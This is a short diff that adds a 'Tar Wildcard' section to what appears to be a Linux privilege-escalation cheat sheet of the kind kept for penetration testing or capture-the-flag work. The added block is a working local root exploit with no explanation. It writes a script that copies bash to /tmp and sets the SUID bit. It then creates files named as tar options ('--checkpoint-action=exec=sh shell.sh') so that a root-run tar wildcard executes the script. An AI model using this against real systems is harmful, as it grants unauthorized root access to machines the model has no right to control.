@@ -1650,6 +1650,14 @@ pspy #handy tool to live monitor stuff happening in Linux
 
 grep "CRON" /var/log/syslog #inspecting cron logs
 ```
+## Tar Wildcard
+```bash
+cd /opt/backups
+echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' > shell.sh
+chmod +x shell.sh
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'
+```
 
 ## NFS
 
